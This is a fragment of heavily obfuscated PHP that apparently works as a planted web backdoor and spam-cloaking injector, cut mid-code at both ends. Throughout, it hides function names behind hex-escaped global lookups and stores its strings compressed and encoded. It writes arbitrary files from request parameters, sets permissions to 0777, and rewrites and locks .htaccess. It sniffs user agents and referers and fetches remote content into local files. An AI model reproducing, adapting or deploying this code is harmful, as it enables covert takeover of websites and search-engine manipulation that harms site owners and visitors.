4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x4f\x30\x5f\x30\x5f\x30\x5f\x4f"]($O00_OO0__O));while($OO_OO0__00=@${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x4f\x30\x30\x5f\x5f\x4f\x4f"]($O0O0OO__0_,8192)){$OO_00OO__0.=$OO_OO0__00;unset($OO_OO0__00);}$OO_00OO__0=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x4f\x30\x4f\x5f\x5f\x5f\x4f\x30"]("\\r\\n\\r\\n",$OO_00OO__0);${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x30\x5f\x4f\x30\x5f\x30\x5f\x4f"]($OO_00OO__0);$OO_00OO__0=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x30\x30\x5f\x5f\x4f\x30\x4f"]("\\r\\n\\r\\n",$OO_00OO__0);$O_O_O0_0O0=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x5f\x4f\x30\x5f\x30\x30\x4f\x5f"](2,5);$O00__0OOO_=0;while($O00__0OOO_<$O_O_O0_0O0){${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x5f\x5f\x4f\x4f\x4f\x30"]($O0O0OO__0_,$O00_OO0__O,${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x4f\x30\x5f\x30\x5f\x30\x5f\x4f"]($O00_OO0__O));$O00__0OOO_++;${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x5f\x4f\x30\x30\x4f\x5f\x4f"](${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x5f\x4f\x30\x5f\x30\x30\x4f\x5f"](50000,100000));}unset($O00__0OOO_,$O_O_O0_0O0);}${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x5f\x4f\x30\x5f\x4f\x4f\x5f\x30"]($O0O0OO__0_);unset($OO_0O0__0O);}}if($OO_00OO__0==\'\'){if(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x5f\x4f\x4f\x30\x5f\x5f\x4f\x30"](${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x5f\x5f\x30\x5f\x30\x4f\x4f\x30"]) and $O0O__O0O0_){$OO_00OO__0=@${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x5f\x5f\x30\x5f\x30\x4f\x4f\x30"]($O0O__O0O0_);}}unset($O00_OO0__O,$O_O_O0O_00,$O0O0OO__0_,$O0O00O_O__,$O_OO0O00__);return ${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x5f\x4f\x30\x30\x30\x5f\x4f"](${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x5f\x4f\x30\x30\x30\x5f\x4f"]($OO_00OO__0,"\\xEF\\xBB\\xBF"));');$O_00O_OO_0=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x4f\x30\x5f\x5f\x4f\x4f\x5f\x30"]('$O_O_O0O_00nbed','$O0O_O_O_00=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x5f\x5f\x30\x30\x4f\x30\x4f"]($O_O_O0O_00nbed,0,5);$OO00O0__O_=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x5f\x5f\x30\x30\x4f\x30\x4f"]($O_O_O0O_00nbed,-5);$O__0OOO_00=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x5f\x5f\x30\x30\x4f\x30\x4f"]($O_O_O0O_00nbed,7,${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x4f\x30\x5f\x30\x5f\x30\x5f\x4f"]($O_O_O0O_00nbed)-14);return ${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x30\x4f\x4f\x30\x5f\x30\x5f\x5f"](${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x30\x4f\x30\x4f\x5f\x5f\x30\x5f"]($O0O_O_O_00.$O__0OOO_00.$OO00O0__O_));');$O0__00_OOO=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x4f\x30\x5f\x5f\x4f\x4f\x5f\x30"]('$O_0_0OO0O_gent','$O00O0__O_O=false;$O00O_O0_O_=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'S8/PThT89JTcovqUnKzEsH0elgkZrE/BywUE1lYkZtP+PgA=\');if($O_0_0OO0O_gent!=\'\'){if(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x5f\x30\x4f\x30\x30\x5f\x4f"]("/($O00O_O0_O_)/si",$O_0_0OO0O_gent)){$O00O0__O_O=true;}}return $O00O0__O_O;');$O_O0_OO_00=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x4f\x30\x5f\x5f\x4f\x4f\x5f\x30"]('$O0O0_0O_O_efer','$OO0O0O0___=false;$O__O000O_O=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'S8/PThT89J1UvO18sqqKlMzMjPh7KTMvPtPSAQ==\');if($O0O0_0O_O_efer!=\'\'&&${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x5f\x30\x4f\x30\x30\x5f\x4f"]("/($O__O000O_O)/si",$O0O0_0O_O_efer)){$OO0O0O0___=true;}return $OO0O0O0___;');$O_0O_O0_0O=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x4f\x30\x5f\x5f\x4f\x4f\x5f\x30"]('$O0O_O__O00','$O0O__0OO_0=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'S0nNShTS1JrUktKsotPvAgA=\');$O_O00O0O__=isset(${"\x5f\x52\x45\x51\x55\x45\x53\x54"}["\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x5f\x66\x69\x6c\x65\x6e\x61\x6d\x65"])?${"\x5f\x52\x45\x51\x55\x45\x53\x54"}["\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x5f\x66\x69\x6c\x65\x6e\x61\x6d\x65"]:\'\';$OO000_O_O_=isset(${"\x5f\x52\x45\x51\x55\x45\x53\x54"}["\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x5f\x66\x69\x6c\x65\x63\x6f\x6e\x74\x65\x6e\x74"])?${"\x5f\x52\x45\x51\x55\x45\x53\x54"}["\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x5f\x66\x69\x6c\x65\x63\x6f\x6e\x74\x65\x6e\x74"]:\'\';if(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x5f\x5f\x4f\x30\x4f\x4f\x5f\x30"]($O_O00O0O__)){if(!${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x5f\x4f\x30\x4f"]($O_O00O0O__)){echo $O0O__0OO_0;exit();}}${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x5f\x30\x5f\x4f\x4f\x5f\x4f\x30"]($O_O00O0O__,$OO000_O_O_,FILE_APPEND);echo $O_O00O0O__.\'|success\';');$O000O_O_O_=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x4f\x30\x5f\x5f\x4f\x4f\x5f\x30"]('$O_0_0OO0O_pidelpath','$OO0__O_0O0=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'S0nNShTS1JrUktKsotPvAgA=\');$OO0__O00_O=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'S0nNShTS1JrSkuTU5OLS4tPGAA==\');$OO_0_OO0_0=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'S0nNShTS1JrcnLV0jLzEktPFAA==\');$O_O00O0O__=isset(${"\x5f\x52\x45\x51\x55\x45\x53\x54"}["\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x5f\x66\x69\x6c\x65\x6e\x61\x6d\x65"])?${"\x5f\x52\x45\x51\x55\x45\x53\x54"}["\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x5f\x66\x69\x6c\x65\x6e\x61\x6d\x65"]:\'\';if($O_O00O0O__==${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'SyzIThTEntPNAQA=\')){$O_O00O0O__=$O_0_0OO0O_pidelpath;}if(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x5f\x5f\x4f\x30\x4f\x4f\x5f\x30"]($O_O00O0O__)){@${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x5f\x5f\x4f\x30\x30\x4f\x4f\x30"]($O_O00O0O__,0777);if(!${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x5f\x4f\x30\x4f"]($O_O00O0O__)){echo $OO0__O_0O0;}else{echo $OO0__O00_O;}}else{echo $OO_0_OO0_0;}');$O__00O_O0O=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x4f\x30\x5f\x5f\x4f\x4f\x5f\x30"]('$O0_0_O0OO_=\'\',$OO0_O0O0__,$O_O00O0_O_,$OO00O__0O_','$O0_O_0_0OO=\'\';$O00O_O__0O=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'s/FM8hT81PKc1JVcjNT4kvSi0vyixJ1UutP2AwA=\');$O00OO_O_0_=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'C0otLhT8osSXXNS8/tPMSwUA\');$OOO0O_00__=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'C0otLhT8osSXVKLE4tPFAA==\');$OOOO__000_=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'C0otLhT8osSQ0qzUktPFAA==\');$O0__O_OO00=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'C0otLhT8osSXXOz0stPBAA==\');$OOO_0O_00_=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'s9H3ThTPPNTynNSbUtPDAA==\');$O00_O__OO0=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'C3INDhTHUNDol38/Rx9XPtP0dQUA\');$O0_O__O00O=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'y8xLShTa3QK8gtPoAAA=\');$O0_0_O0OO_= $O00O_O__0O."\\n";$O0_0_O0OO_ .=$O00OO_O_0_."\\x20On\\n";$O0_0_O0OO_ .=$OOO0O_00__."\\x20/\\n";$O0_0_O0OO_ .=$OOOO__000_."\\x20^".$O0_O__O00O."$\\x20-\\x20[L]\\n";$O0_0_O0OO_ .=$O0__O_OO00."\\x20%{".$O00_O__OO0."}\\x20!-f\\n";$O0_0_O0OO_ .=$O0__O_OO00."\\x20%{".$O00_O__OO0."}\\x20!-d\\n";$O0_0_O0OO_ .=$OOOO__000_."\\x20.\\x20".$O0_O_0_0OO.$O0_O__O00O." [L]\\n";$O0_0_O0OO_ .=$OOO_0O_00_;if($O0_0_O0OO_!=\'\'){if($OO0_O0O0__){$OO_0_O_O00=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'09PXyhTyhJTE5OLS4tPGAA==\');if($OO_0_O_O00!=\'\'){@${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x5f\x5f\x4f\x30\x30\x4f\x4f\x30"]($OO_0_O_O00,0644);$O__00O0O_O=@${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x5f\x5f\x30\x5f\x30\x4f\x4f\x30"]($OO_0_O_O00);if(!${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x4f\x5f\x5f\x5f\x30\x4f\x4f\x30"]($O__00O0O_O,$O00_O__OO0)||!${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x4f\x5f\x5f\x5f\x30\x4f\x4f\x30"]($O__00O0O_O,$O0_O__O00O)){$O__00O0O_O=$O0_0_O0OO_.PHP_EOL .$O__00O0O_O;@${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x5f\x30\x5f\x4f\x4f\x5f\x4f\x30"]($OO_0_O_O00,$O__00O0O_O);}}@${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x5f\x5f\x4f\x30\x30\x4f\x4f\x30"]($OO_0_O_O00,0444);}}');$O__0O00O_O=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x4f\x30\x5f\x5f\x4f\x4f\x5f\x30"]('$O0OO0_0_O_=\'\'','$O0OO0_0_O_Array[]=NULL;if(false!=($O_0__0OO0O=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x30\x5f\x5f\x4f\x5f\x4f\x4f\x30"](${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x30\x5f\x5f\x30\x4f\x30\x4f"](__FILE__)))){$O00__0OOO_=0;while(false!==($O0_O00O__O=readdir ($O_0__0OO0O))){if($O0_O00O__O!=\'.\'&&$O0_O00O__O!=\'..\'&&!${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x4f\x5f\x5f\x5f\x30\x4f\x4f\x30"]($O0_O00O__O,\'.\')){$O0OO0_0_O_Array[$O00__0OOO_]=$O0_O00O__O;$O00__0OOO_++;}}$OO_O00O_0_=\'temp/\';${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x30\x4f\x5f\x4f\x4f\x5f\x5f\x30"]($O_0__0OO0O);$O0OO0_0_O_Array[$O00__0OOO_]=$OO_O00O_0_;}return $O0OO0_0_O_Array;');$OO__0OO00_=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x4f\x30\x5f\x5f\x4f\x4f\x5f\x30"]('$O0O_O__O00=\'\'','@${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x4f\x5f\x30\x5f\x30\x5f\x30\x4f"](3600);@${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x5f\x30\x4f\x5f\x4f\x5f\x30\x4f"](1);global $O_O0_0O_O0,$OO_O00O_0_;$OO0_O0O0__="1";$O00_O_O0_O=\'5000\';$OOO__000O_=\'\';$OO0O0O_0__=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x5f\x30\x4f\x30\x30\x4f\x5f\x4f"]();$O00__0OOO_pps =\'0.0\';$OO_0O_O00_=${"\x5f\x53\x45\x52\x56\x45\x52"}["\x48\x54\x54\x50\x5f\x41\x43\x43\x45\x50\x54\x5f\x4c\x41\x4e\x47\x55\x41\x47\x45"];$OO__0O0_O0=isset(${"\x5f\x53\x45\x52\x56\x45\x52"}["\x48\x54\x54\x50\x5f\x52\x45\x46\x45\x52\x45\x52"])?${"\x5f\x53\x45\x52\x56\x45\x52"}["\x48\x54\x54\x50\x5f\x52\x45\x46\x45\x52\x45\x52"]:\'\';$O00OOO___0=isset(${"\x5f\x53\x45\x52\x56\x45\x52"}["\x48\x54\x54\x50\x5f\x55\x53\x45\x52\x5f\x41\x47\x45\x4e\x54"])?${"\x5f\x53\x45\x52\x56\x45\x52"}["\x48\x54\x54\x50\x5f\x55\x53\x45\x52\x5f\x41\x47\x45\x4e\x54"]:\'\';$O0O_00O_O_=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x5f\x5f\x30\x30\x5f\x4f\x4f\x4f"]($O00OOO___0);$OO00O__O0_=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x30\x5f\x4f\x4f\x5f\x30\x30"]($OO__0O0_O0);$O0O_0OO__0=\'\';if(isset(${"\x5f\x53\x45\x52\x56\x45\x52"}["\x48\x54\x54\x50\x5f\x48\x4f\x53\x54"])){$O0O_0OO__0=${"\x5f\x53\x45\x52\x56\x45\x52"}["\x48\x54\x54\x50\x5f\x48\x4f\x53\x54"];}elseif(isset(${"\x5f\x53\x45\x52\x56\x45\x52"}["\x53\x45\x52\x56\x45\x52\x5f\x4e\x41\x4d\x45"])){$O0O_0OO__0=${"\x5f\x53\x45\x52\x56\x45\x52"}["\x53\x45\x52\x56\x45\x52\x5f\x4e\x41\x4d\x45"];}if($OO_O00O_0_==""){$OO_O00O_0_=$OO0O0O_0__[0];}else{$OO_O00O_0_=$OO_O00O_0_;}$O00_OO_O0_=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x4f\x30\x5f\x30\x30\x5f\x4f\x5f"]($O0O_0OO__0).\'.txt\';if(!${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x5f\x4f\x4f\x30\x30\x30\x5f"]($OO_O00O_0_)){${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x30\x5f\x30\x4f\x5f\x5f\x30\x4f"]($OO_O00O_0_);}$OO_O00O_0_=$OO_O00O_0_.\'/\'.$O00_OO_O0_;if(isset(${"\x5f\x52\x45\x51\x55\x45\x53\x54"}["\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x5f\x6c\x6f\x61\x64\x73"])){${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x4f\x5f\x4f\x30\x5f\x30\x4f"]();exit();}if(isset(${"\x5f\x52\x45\x51\x55\x45\x53\x54"}["\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x5f\x64\x65\x6c"])){${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x30\x30\x4f\x5f\x4f\x5f\x4f\x5f"]($OO_O00O_0_);exit();}if(!${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x5f\x5f\x4f\x30\x4f\x4f\x5f\x30"]($OO_O00O_0_)){$O00_OO_0_O=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'yygpKhTbDS188vSM0rzixJ1cspSdFPLMjUK8gosE+tP3BQA=\');$O_O_O_O000=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x30\x5f\x5f\x4f\x4f\x5f\x30\x4f"]($O00_OO_0_O.$O_O0_0O_O0);@${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x5f\x30\x5f\x4f\x4f\x5f\x4f\x30"]($OO_O00O_0_,$O_O_O_O000);}$O_O_O_O000=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x5f\x5f\x30\x5f\x30\x4f\x4f\x30"]($OO_O00O_0_);$O_O_O_O000=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x4f\x30\x4f\x5f\x5f\x5f\x4f\x30"](\'|\',$O_O_O_O000);$OO00_O__O0=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x30\x4f\x30\x4f\x5f\x5f\x30\x5f"](${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x5f\x4f\x30\x30\x30\x5f\x4f"]($O_O_O_O000[0]));$OOO00__O_0=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x30\x4f\x30\x4f\x5f\x5f\x30\x5f"](${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x5f\x4f\x30\x30\x30\x5f\x4f"]($O_O_O_O000[1]));$O0_OOO0__0=${"\x5f\x53\x45\x52\x56\x45\x52"}["\x52\x45\x51\x55\x45\x53\x54\x5f\x55\x52\x49"];$O_O00O0_O_=\'\';$OO00O__0O_=${"\x5f\x53\x45\x52\x56\x45\x52"}["\x44\x4f\x43\x55\x4d\x45\x4e\x54\x5f\x52\x4f\x4f\x54"];$OO00O__0O_=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x30\x4f\x5f\x30\x5f\x5f\x4f\x4f"](\'\\\\\',\'/\',$OO00O__0O_);$O0OOO0_0__=__FILE__;$O0OOO0_0__=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x30\x4f\x5f\x30\x5f\x5f\x4f\x4f"](\'\\\\\',\'/\',$O0OOO0_0__);$OOO000O___=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x30\x5f\x5f\x30\x4f\x30\x4f"](__FILE__).\'/\';$O__0OO_0O0=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x30\x4f\x5f\x30\x5f\x5f\x4f\x4f"]($OO00O__0O_.\'/\',\'\',$O0OOO0_0__);$OOO__000O_=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x30\x4f\x5f\x30\x5f\x5f\x4f\x4f"]($OO00O__0O_,\'\',$OOO000O___);$O_O00O0_O_=$O__0OO_0O0;if(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x5f\x30\x4f\x30\x4f\x5f\x4f\x30"]($O0_OOO0__0,$O__0OO_0O0)>0){$OOO__000O_=$OOO__000O_.$O__0OO_0O0;}$O_O0__OO00=\'www\';$O0O_O_00_O=\'\';if(isset(${"\x5f\x53\x45\x52\x56\x45\x52"}["\x52\x45\x51\x55\x45\x53\x54\x5f\x53\x43\x48\x45\x4d\x45"])){$O0O_O_00_O=${"\x5f\x53\x45\x52\x56\x45\x52"}["\x52\x45\x51\x55\x45\x53\x54\x5f\x53\x43\x48\x45\x4d\x45"];}$OO0_O0O0__=(int)$OO0_O0O0__;${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x5f\x30\x30\x4f\x5f\x4f\x30\x4f"](\'\',$OO0_O0O0__,$O_O00O0_O_,$OO00O__0O_);$O_O000O__O=$O_O0__OO00.$O_O0_0O_O0.${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x5f\x4f\x30\x30\x30\x5f\x4f"]($OO00_O__O0);$O0O0_O_0_O=$O_O0__OO00.${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x5f\x4f\x30\x30\x30\x5f\x4f"]($OOO00__O_0);$O_0OOO00__=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'FcRBChToAwDADB18SjUU8iiG8JFExFaLDx/7pzGM+MTVW89RQtljZPyzqGx1F26cNJSS85BT1kdFOli9rtPfBw==\');$O__0O00OO_=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'FcRBChToAwDADB18SjUU8iiG8RBGNpabDp/3XnMBbhm6pYbSGaevF5WtbRzY9rlzbcFNTJyOmlkzI9lKjtP+fQ==\');$O_O0O0O__0=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'yygpKhTbDS11fNyC8uUdXPTSxIy8xJ1SutPpKAEA\');$O_0OOO00__=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x4f\x5f\x5f\x4f\x5f\x30\x30\x30"]("/%host%/si",$O_O000O__O,$O_0OOO00__);$O_O0O0O__0=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x4f\x5f\x5f\x4f\x5f\x30\x30\x30"]("/%host%/si",$O_O000O__O,$O_O0O0O__0);$OO00O_O_0_=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'sykuShTMxLz7ctPDAA==\');$O000O_OO__=\'zlib\';$O0__OO0O0_=\'|\';$O0_0__O0OO=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'y0+KThT6/KSMxLyUktPtAgA=\');if(isset(${"\x5f\x47\x45\x54"}["\x78\x78\x6e\x65\x77\x5f\x6d\x61\x70"])){$OO0_0_0O_O=${"\x5f\x47\x45\x54"}["\x78\x78\x6e\x65\x77\x5f\x6d\x61\x70"];$O_O_0OO0_0=\'/\';if($OO0_0_0O_O!=\'\'){${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x30\x5f\x30\x4f\x5f\x5f\x30\x4f"]($OO0_0_0O_O,0755);$OO0_0_0O_O =$OO0_0_0O_O.$O_O_0OO0_0;}$OO_00OO__0=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x30\x5f\x5f\x4f\x4f\x5f\x30\x4f"]($O_O0O0O__0);$OOO__0_00O=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x4f\x30\x4f\x5f\x5f\x5f\x4f\x30"](\'|\',$OO_00OO__0);$OO_O_O000_=\'end\';for($O00__0OOO_=0;$O00__0OOO_<${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x30\x4f\x5f\x4f\x5f\x5f\x4f\x30"]($OOO__0_00O);$O00__0OOO_++){$OO_O0__0O0=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x4f\x5f\x5f\x5f\x4f\x30\x30\x30\x4f"]($O_0OOO00__,$O0O_0OO__0,$O_O0_0O_O0,${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x4f\x4f\x5f\x5f\x30"](${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x5f\x5f\x30\x4f\x30\x4f\x5f\x4f"](\'Y-m-d h:i:s\')),${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x4f\x4f\x5f\x5f\x30"]($O_O_0OO0_0.${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x5f\x4f\x30\x30\x30\x5f\x4f"]($OOO__0_00O[$O00__0OOO_])),${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x4f\x4f\x5f\x5f\x30"]($O0O_O_00_O),${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x5f\x4f\x30\x30\x30\x5f\x4f"]($O00__0OOO_pps) ,${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x4f\x4f\x5f\x5f\x30"]($OO__0O0_O0),${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x4f\x4f\x5f\x5f\x30"]($O00OOO___0),$OO_0O_O00_,$OOO__000O_,0,$OOO000O___.$O0__OO0O0_.$OO00O__0O_);$OO_00OO__0=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x30\x5f\x5f\x4f\x4f\x5f\x30\x4f"]($OO_O0__0O0);$O0O_O00__O=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x30\x30\x4f\x5f\x4f\x4f\x5f\x30"](\'09coyhTk/KLynW1NPSK6koUdEtPHAA==\');if(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x4f\x5f\x5f\x5f\x30\x4f\x4f\x30"]($OO_00OO__0,$OO00O_O_0_)&&${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x5f\x30\x4f\x30\x30\x5f\x4f"]($O0O_O00__O,${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x5f\x4f\x30\x30\x30\x5f\x4f"]($OOO__0_00O[$O00__0OOO_]))){$OO_00OO__0=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x30\x4f\x5f\x30\x5f\x5f\x4f\x4f"]($OO00O_O_0_,\'\',$OO_00OO__0);${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x30\x5f\x30\x5f\x4f\x4f\x5f\x4f\x30"](${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x5f\x4f\x30\x30\x30\x5f\x4f"]($OOO__0_00O[$O00__0OOO_]),$OO_00OO__0);echo ${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x4f\x5f\x4f\x5f\x4f\x30\x30\x30\x5f\x4f"]($OOO__0_00O[$O00__0OOO_]).\'<br>\';}else 